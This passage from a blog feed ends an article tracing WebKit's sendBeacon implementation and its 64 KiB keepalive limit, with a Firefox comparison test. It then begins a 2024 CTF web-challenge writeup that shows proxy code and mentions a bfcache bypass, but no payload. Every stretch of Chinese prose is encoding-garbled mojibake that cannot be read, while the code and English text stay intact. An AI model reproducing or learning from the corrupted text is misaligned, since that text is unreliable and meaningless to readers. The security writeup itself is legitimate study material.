punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>document<span class="token punctuation">.</span><span class="token function">checkedContentSecurityPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">allowConnectToSource</span><span class="token punctuation">(</span>parsedUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// We simulate a network error so we return true here. This is consistent with Blink.</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ResourceRequest <span class="token function">request</span><span class="token punctuation">(</span>parsedUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function">setHTTPMethod</span><span class="token punctuation">(</span><span class="token string">"POST"</span>_s<span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function">setRequester</span><span class="token punctuation">(</span>ResourceRequestRequester<span class="token double-colon punctuation">::</span>Beacon<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>RefPtr documentLoader <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">loader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        request<span class="token punctuation">.</span><span class="token function">setIsAppInitiated</span><span class="token punctuation">(</span>documentLoader<span class="token operator">-></span><span class="token function">lastNavigationWasAppInitiated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ResourceLoaderOptions options<span class="token punctuation">;</span>    options<span class="token punctuation">.</span>credentials <span class="token operator">=</span> FetchOptions<span class="token double-colon punctuation">::</span>Credentials<span class="token double-colon punctuation">::</span>Include<span class="token punctuation">;</span>    options<span class="token punctuation">.</span>cache <span class="token operator">=</span> FetchOptions<span class="token double-colon punctuation">::</span>Cache<span class="token double-colon punctuation">::</span>NoCache<span class="token punctuation">;</span>    options<span class="token punctuation">.</span>keepAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    options<span class="token punctuation">.</span>sendLoadCallbacks <span class="token operator">=</span> SendCallbackPolicy<span class="token double-colon punctuation">::</span>SendCallbacks<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        options<span class="token punctuation">.</span>mode <span class="token operator">=</span> FetchOptions<span class="token double-colon punctuation">::</span>Mode<span class="token double-colon punctuation">::</span>NoCors<span class="token punctuation">;</span>        String mimeType<span class="token punctuation">;</span>        <span class="token keyword">auto</span> result <span class="token operator">=</span> <span class="token class-name">FetchBody</span><span class="token double-colon punctuation">::</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">WTFMove</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimeType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">hasException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">releaseException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> fetchBody <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">releaseReturnValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fetchBody<span class="token punctuation">.</span><span class="token function">isReadableStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> Exception <span class="token punctuation">&#123;</span> ExceptionCode<span class="token double-colon punctuation">::</span>TypeError<span class="token punctuation">,</span> <span class="token string">"Beacons cannot send ReadableStream body"</span>_s <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        request<span class="token punctuation">.</span><span class="token function">setHTTPBody</span><span class="token punctuation">(</span>fetchBody<span class="token punctuation">.</span><span class="token function">bodyAsFormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mimeType<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">setHTTPContentType</span><span class="token punctuation">(</span>mimeType<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isCrossOriginSafeRequestHeader</span><span class="token punctuation">(</span>HTTPHeaderName<span class="token double-colon punctuation">::</span>ContentType<span class="token punctuation">,</span> mimeType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                options<span class="token punctuation">.</span>mode <span class="token operator">=</span> FetchOptions<span class="token double-colon punctuation">::</span>Mode<span class="token double-colon punctuation">::</span>Cors<span class="token punctuation">;</span>                options<span class="token punctuation">.</span>httpHeadersToKeep<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>HTTPHeadersToKeepFromCleaning<span class="token double-colon punctuation">::</span>ContentType<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">auto</span> cachedResource <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">protectedCachedResourceLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">requestBeaconResource</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token function">WTFMove</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span> options <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cachedResource<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">logError</span><span class="token punctuation">(</span>cachedResource<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ASSERT</span><span class="token punctuation">(</span><span class="token operator">!</span>m_inflightBeacons<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>cachedResource<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    m_inflightBeacons<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cachedResource<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cachedResource<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">addClient</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°æ•´å€‹æµç¨‹èˆ‡ Chromium æ˜¯å·®ä¸å¤šçš„ï¼Œå…ˆæª¢æŸ¥ URL çš„åˆæ³•æ€§ï¼Œæ¥è‘—æª¢æŸ¥ CSPï¼Œç„¶å¾Œé€å‡ºä¸€å€‹ keepalive çš„è«‹æ±‚ã€‚</p><p>é€™å‘¼æ‡‰åˆ°æˆ‘å€‘ä¹‹å‰æ‰€èªªçš„ä»¥åŠè¦æ ¼ä¸Šå¯«çš„ï¼ŒsendBeacon åº•å±¤å°±æ˜¯å€‹ keepalive çš„ fetchã€‚é‚£ keepalive queue å¤§å°è¶…éçš„åŸå§‹ç¢¼æœƒåœ¨å“ªè£¡å‘¢ï¼Ÿ</p><p>å¾å¯¦ä½œä¸­å¯ä»¥çœ‹å‡ºå¦‚æœ queue çš„å¤§å°è¶…éäº†ï¼Œå…«æˆå°±æ˜¯é€™ä¸€æ®µå‡ºéŒ¯ï¼Œå› ç‚ºåªæœ‰é€™é‚Šæœƒå›å‚³ falseï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> cachedResource <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">protectedCachedResourceLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">requestBeaconResource</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token function">WTFMove</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span> options <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cachedResource<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">logError</span><span class="token punctuation">(</span>cachedResource<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤å¯ä»¥å¾€ <code>requestBeaconResource</code> ä¸‹å»è¿½è¹¤ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥å¾å¦ä¸€å€‹æ–¹å‘ä¾†è¿½è¹¤åŸå§‹ç¢¼åœ¨å“ªä¸€æ®µã€‚</p><p>é‚„è¨˜å¾—å‰›å‰›é‚£å€‹é€å‡º 8 å€‹é•·åº¦ 10000 çš„å­—ä¸²çš„ç¯„ä¾‹å—ï¼Ÿåœ¨ Chrome ä¸Šåªæœƒçœ‹åˆ°è«‹æ±‚è®Šæˆ pendingï¼Œä½†æ˜¯åœ¨ Safari ä¸Šæœƒå‡ºç¾è²¼å¿ƒçš„æç¤ºï¼š</p><blockquote><p>Beacon API cannot load <a href="https://httpstat.us/200?log7">https://httpstat.us/200?log7</a>. Reached maximum amount of queued data of 64Kb for keepalive requests</p></blockquote><p>ç›´æ¥ç”¨é€™å€‹éŒ¯èª¤è¨Šæ¯å°±å¯ä»¥æ‰¾åˆ°ç›¸é—œçš„åŸå§‹ç¢¼ï¼Œåœ¨ <a href="https://github.com/WebKit/WebKit/blob//WebKit-7620.1.16.111.5/Source/WebCore/loader/cache/CachedResource.cpp#L249">WebKit&#x2F;Source&#x2F;WebCore&#x2F;loader&#x2F;cache&#x2F;CachedResource.cpp</a>ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>    m_options<span class="token punctuation">.</span>keepAlive <span class="token operator">&amp;&amp;</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> Type<span class="token double-colon punctuation">::</span>Ping <span class="token operator">&amp;&amp;</span>    <span class="token operator">!</span>cachedResourceLoader<span class="token punctuation">.</span><span class="token function">keepaliveRequestTracker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">tryRegisterRequest</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setResourceError</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      errorDomainWebKitInternal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">"Reached maximum amount of queued data of 64Kb for keepalive requests"</span>_s<span class="token punctuation">,</span>      ResourceError<span class="token double-colon punctuation">::</span>Type<span class="token double-colon punctuation">::</span>AccessControl    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">failBeforeStarting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ˜¯ keepaliveï¼Œè€Œä¸” type ä¸æ˜¯ pingï¼ˆsendBeacon çš„ type æœƒæ˜¯ <code>Type::Beacon</code>ï¼‰ï¼Œåˆæ²’è¾¦æ³•è¨»å†Šæ–°çš„è«‹æ±‚ï¼Œå°±å›å‚³é€™å€‹éŒ¯èª¤ã€‚</p><p>å› æ­¤é‡é»å°±æ˜¯ <code>keepaliveRequestTracker().tryRegisterRequest</code> é€™å€‹æ–¹æ³•äº†ï¼Œåœ¨ <a href="https://github.com/WebKit/WebKit/blob/WebKit-7620.1.16.111.5/Source/WebCore/loader/cache/KeepaliveRequestTracker.cpp">Source&#x2F;WebCore&#x2F;loader&#x2F;cache&#x2F;KeepaliveRequestTracker.cpp</a>ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">uint64_t</span> maxInflightKeepaliveBytes <span class="token punctuation">&#123;</span> <span class="token number">65536</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 64 kibibytes as per Fetch specification.</span><span class="token keyword">bool</span> <span class="token class-name">KeepaliveRequestTracker</span><span class="token double-colon punctuation">::</span><span class="token function">tryRegisterRequest</span><span class="token punctuation">(</span>CachedResource<span class="token operator">&amp;</span> resource<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ASSERT</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>keepAlive<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> body <span class="token operator">=</span> resource<span class="token punctuation">.</span><span class="token function">resourceRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">httpBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>body<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">uint64_t</span> bodySize <span class="token operator">=</span> body<span class="token operator">-></span><span class="token function">lengthInBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m_inflightKeepaliveBytes <span class="token operator">+</span> bodySize <span class="token operator">></span> maxInflightKeepaliveBytes<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token function">registerRequest</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å¯¦ä¹Ÿå°±åªæ˜¯ç®—ä¸€ä¸‹é‚„åœ¨ç­‰å¾…çš„æœ‰å¤šå°‘ï¼ŒåŠ ä¸Šå»æœƒä¸æœƒè¶…éæœ€å¤§å€¼ 65536ï¼Œåšçš„äº‹æƒ…è·Ÿ Sentry æœ€å¾Œçš„é‚£å€‹ PR å·®ä¸å¤šã€‚</p><h3><span id="firefox-çš„-sendbeacon-å¯¦ä½œ">Firefox çš„ sendBeacon å¯¦ä½œ</span></h3><p>åœ¨ä¹‹å‰ Sentry çš„ PR ä¸­å…¶å¯¦å°±æœ‰æåˆ° Firefox ä¸æ”¯æ´ keepaliveï¼Œå°æ‡‰åˆ°çš„ ticket æ˜¯é€™å¼µï¼š<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1342484">[meta] Support Fetch keepalive flag and enforce limit on inflight keepalive bytes</a>ï¼Œç›®å‰é‚„æ²’è¢«é—œé–‰ï¼Œå¾è¨è«–ä¸­çœ‹èµ·ä¾†ä¼¼ä¹åŠå¹´å‰é–‹å§‹æœ‰äº†é€²å±•ï¼Œåœ¨ 2024 å¹´ 11 æœˆæ¨å‡ºçš„ Firefox 133 ç‰ˆæœ¬ä¸­æ­£å¼é–‹å§‹æ”¯æ´ï¼Œé›–ç„¶é‚„æœ‰ä¸€äº› bugï¼Œä½†æ‡‰è©²æœƒè¶Šä¾†è¶Šç©©å®šã€‚</p><p>æˆ‘ç”¨ä¸‰å€‹ç€è¦½å™¨æ¸¬è©¦äº†ä¸€å€‹æƒ…å¢ƒï¼Œé€å‡º 10 å€‹é•·åº¦ 6 è¬çš„å­—ä¸²ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">"https://httpstat.us/200?log"</span><span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">60000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Chrome è·Ÿ Safari éƒ½åªé€å‡ºäº†ä¸€å€‹è«‹æ±‚ï¼Œä½†æ˜¯ Firefox 133.0.3  å€’æ˜¯å¾ˆè²¼å¿ƒåœ°å…¨éƒ¨éƒ½é€å‡ºå»äº†ï¼Œç›®å‰é‚„æ²’æœ‰ 64 KiB çš„é™åˆ¶ï¼š</p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p7.png" alt="Firefox æˆªåœ–"></p><p>å¦‚æœæœ‰äººå¥½å¥‡åº•å±¤å¯¦ä½œï¼Œç¨‹å¼ç¢¼åœ¨é€™è£¡ï¼š<a href="https://github.com/mozilla/gecko-dev/blob/94c62970ba2f9c40efd5a4f83a538595425820d9/dom/base/Navigator.cpp#L1163">gecko-dev&#x2F;dom&#x2F;base&#x2F;Navigator.cpp</a>ï¼Œç›®å‰çœ‹èµ·ä¾†æ‡‰è©²é‚„æ²’æŠŠ keepalive æ•´é€²å»ï¼Œæ‰€ä»¥æ‰æ²’æœ‰è§¸ç™¼åˆ°ä¸Šé™ã€‚æœªä¾†æ‡‰è©²æœƒæŒ‰ç…§ spec èµ°ï¼Œä½¿ç”¨ keepalive è«‹æ±‚ï¼Œä¸¦ä¸”éµå®ˆ payload çš„å¤§å°é™åˆ¶ã€‚</p><h2><span id="çµèª">çµèª</span></h2><p>å°åŠŸèƒ½å¤§å­¸å•ï¼Œä¸€å€‹çœ‹ä¼¼ç°¡å–®çš„ <code>sendBeacon</code>ï¼Œå…¶å¯¦æ·±å…¥ç ”ç©¶ä¹‹å¾Œä¹Ÿæ»¿æœ‰è¶£çš„ï¼ŒçŸ¥é“äº†å®ƒçš„é™åˆ¶ã€è§£æ³•ï¼Œä¹Ÿèƒ½å¾ Sentry çš„ä¿®è£œéç¨‹ä¸­å­¸åˆ°ä¸€äº›ç¶“é©—ï¼Œé‚„çœ‹äº†ç€è¦½å™¨çš„åŸå§‹ç¢¼ï¼Œæ›´ç†è§£èƒŒå¾Œçš„å¯¦ä½œã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œåœ¨å¯¦å‹™ä¸Šè‹¥æ˜¯è¦ä½¿ç”¨ <code>sendBeacon</code>ï¼Œéƒ½è«‹è¨˜å¾—åŠ å€‹éŒ¯èª¤è™•ç†ï¼Œåœ¨å›å‚³å€¼æ˜¯ false æ™‚ï¼Œæ”¹æˆä¸€èˆ¬çš„ fetch æˆ–æ˜¯åŠ ä¸Šé‡è©¦æ©Ÿåˆ¶ï¼Œæ‰èƒ½åŠ å¼·è³‡æ–™å‚³è¼¸çš„ç©©å®šæ€§ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç•¶ä½ æƒ³åœ¨ç¶²é ä¸Šå‘ server ç™¼é€ä¸€äº› tracking ç›¸é—œçš„è³‡è¨Šæ™‚ï¼Œæ¯”èµ·ç›´æ¥ç”¨ &lt;code&gt;fetch&lt;/code&gt; é€å‡ºè«‹æ±‚ï¼Œæœ‰å¦ä¸€å€‹é€šå¸¸æœƒè¢«æ¨è–¦çš„é¸æ“‡ï¼š&lt;code&gt;navigator.sendBeacon&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç‚ºä»€éº¼æœƒæ¨è–¦é€™å€‹å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å› ç‚ºå¦‚æœæ˜¯ç”¨ä¸€èˆ¬é€å‡ºè«‹æ±‚çš„æ–¹æ³•ï¼Œåœ¨ä½¿ç”¨è€…æŠŠé é¢é—œæ‰æˆ–æ˜¯è·³è½‰çš„æ™‚å€™å¯èƒ½æœƒæœ‰å•é¡Œï¼Œä¾‹å¦‚èªªå‰›å¥½åœ¨é—œæ‰é é¢æ™‚ç™¼é€è«‹æ±‚ï¼Œé€™å€‹è«‹æ±‚å¯èƒ½å°±é€ä¸å‡ºå»ï¼Œéš¨è‘—é é¢é—œé–‰ä¸€èµ·è¢«å–æ¶ˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;é›–ç„¶èªªå¯ä»¥åˆ©ç”¨ä¸€äº›æ–¹æ³•å˜—è©¦å¼·åˆ¶é€å‡ºè«‹æ±‚ï¼Œä½†é€™äº›æ–¹æ³•é€šå¸¸éƒ½æœƒå‚·å®³ä½¿ç”¨è€…é«”é©—ï¼Œä¾‹å¦‚èªªå¼·åˆ¶è®“é é¢æ™šä¸€é»é—œé–‰ï¼Œæˆ–æ˜¯é€å‡ºä¸€å€‹åŒæ­¥çš„è«‹æ±‚ä¹‹é¡çš„ã€‚&lt;/p&gt;
&lt;p&gt;è€Œ &lt;code&gt;navigator.sendBeacon&lt;/code&gt; å°±æ˜¯ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œè€Œç”Ÿçš„ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF &amp; corCTF &amp; sekaiCTF 2024 ç­†è¨˜</title>
    <link href="https://blog.huli.tw/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/"/>
    <id>https://blog.huli.tw/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/</id>
    <published>2024-09-23T02:40:00.000Z</published>
    <updated>2024-09-23T09:16:08.011Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹…é•çš„ç­†è¨˜ï¼Œæƒ³å¯«å¾ˆä¹…äº†ä½†ä¸€ç›´æ‹–å»¶ï¼Œåƒæ˜¯ CTF é€™ç¨®æ±è¥¿çš„ writeup å…¶å¯¦é€Ÿåº¦æ»¿é‡è¦çš„ï¼Œå› ç‚ºè³½å¾Œè¨è«–å¤§éƒ¨åˆ†éƒ½åœ¨ Discord è£¡é¢ç™¼ç”Ÿï¼Œæ™‚é–“ä¹…äº†è¨Šæ¯æ¯”è¼ƒé›£æ‰¾ï¼Œè€Œä¸”å¾ˆæœ‰å¯èƒ½å¿˜è¨˜ï¼Œè¦è¶•å¿«å¯«æˆ writeup æ‰èƒ½æŠŠé‚£äº›å¯¦ç”¨çš„è³‡è¨Šè¨˜éŒ„ä¸‹ä¾†ã€‚</p><p>é€™ç¯‡ä¸€æ¬¡å¸¶ä¾†ä¸‰å€‹ CTF çš„ writeupï¼Œæœ‰äº›æˆ‘æ²’æœ‰æ‰“ï¼Œåªæ˜¯ç´”ç²¹çœ‹è‘—åˆ¥äººçš„ç­†è¨˜é‡æ–°è¨˜ä¸€éè€Œå·²ã€‚</p><p>é—œéµå­—åˆ—è¡¨ï¼š</p><ol><li>bfcache</li><li>response splitting</li><li>Service-Worker-Allowed</li><li>gunicorn script_name</li><li>socket.io disconnect</li><li>socket.io JSONP CSP bypass</li><li>performance API</li><li>streaming HTML parsing </li><li>content-type ISO-2022-JP</li></ol><span id="more"></span><h2><span id="hitcon-ctf-2024">HITCON CTF 2024</span></h2><h3><span id="private-browsing">Private Browsing+</span></h3><p>é€™é¡ŒåŸºæœ¬ä¸Šæ˜¯å€‹ proxyï¼ŒæœƒæŠŠ <code>/~huli/</code> åº•ä¸‹çš„æ±è¥¿ proxy åˆ°å…¶ä»–ç¶²ç«™ï¼Œè€Œ response æœƒæ ¹æ“š header ä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>    req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'sec-fetch-mode'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>    req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'sec-fetch-mode'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'navigate'</span> <span class="token operator">&amp;&amp;</span>    req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'sec-fetch-site'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'same-origin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>url <span class="token operator">=</span> chunks<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    proxy<span class="token punctuation">.</span><span class="token function">handler</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span><span class="token constant">DEFAULT_HEADERS</span><span class="token punctuation">,</span> <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token constant">VIEWER_HTML</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'SITEB64'</span><span class="token punctuation">,</span> <span class="token function">btoa</span><span class="token punctuation">(</span>proxy<span class="token punctuation">.</span>site<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ˜¯ navigate çš„è©±ï¼Œå°±æœƒå›å‚³ VIEWER_HTMLï¼Œåœ¨é€™è£¡é¢æœƒåšå„ç¨® sanitizeï¼Œæ‰€ä»¥æ²’è¾¦æ³• XSSã€‚</p><p>ç¹éæ–¹å¼æ˜¯åˆ©ç”¨ bfcacheï¼Œåœ¨ <a href="https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</a> 